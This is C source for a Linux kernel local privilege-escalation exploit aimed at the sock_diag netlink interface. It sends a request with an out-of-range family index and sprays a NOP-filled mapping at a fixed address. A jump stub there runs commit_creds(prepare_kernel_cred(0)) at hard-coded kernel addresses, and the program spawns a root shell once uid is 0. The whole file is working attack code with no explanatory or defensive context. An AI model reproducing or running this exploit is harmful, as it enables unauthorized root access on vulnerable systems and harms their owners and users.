#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/filter.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <linux/unix_diag.h>
#include <sys/mman.h>

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long sock_diag_handlers, nl_table;

int __attribute__((regparm(3))) kernel_code() {
    commit_creds(prepare_kernel_cred(0)); 
    return -1;
}

int main(int argc, char*argv[]) {
    int fd;
    unsigned family;
    struct {
        struct nlmsghdr nlh;    
        struct unix_diag_req r;
    } req;
    char buf[8192];

    if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0){
        printf("Can't create sock diag socket\n");
        return -1;
    }

    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = sizeof(req);
    req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
    req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
    req.nlh.nlmsg_seq = 123456;

    req.r.udiag_states = -1;
    req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;

    commit_creds = (_commit_creds) 0xc1057420;
    prepare_kernel_cred = (_prepare_kernel_cred) 0xc1057640;
    req.r.sdiag_family = 49;

    unsigned long mmap_start, mmap_size;
    mmap_start = 0x90909000; 
    mmap_size = 0x120000;    
    printf("mmapping at 0x%lx, size = 0x%lx\n", mmap_start, mmap_size);

    if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC, 
                    MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
        printf("mmap fault\n");
        exit(1);
    }
    memset((void*)mmap_start, 0x90, mmap_size);    

    char jump[] = "\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"; 
    /*
        0:   55                      push   ebp
        1:   89 e5                   mov    ebp,esp
        3:   b8 11 11 11 11          mov    eax,0x11111111; 0x11111111 => kernel_code :)
        8:   ff d0                   call   eax
        a:   5d                      pop    ebp
        b:   c3                      ret
    */
    unsigned long *asd = &jump[4];
    *asd = (unsigned long)kernel_code; 

    memcpy( (void*)mmap_start+mmap_size-sizeof(jump), jump, sizeof(jump));

    if ( send(fd, &req, sizeof(req), 0) < 0) {
        printf("bad send\n");
        close(fd);
        return -1;
    }

    printf("uid=%d, euid=%d\n", getuid(), geteuid());

    if(!getuid()) system("/bin/sh");
}
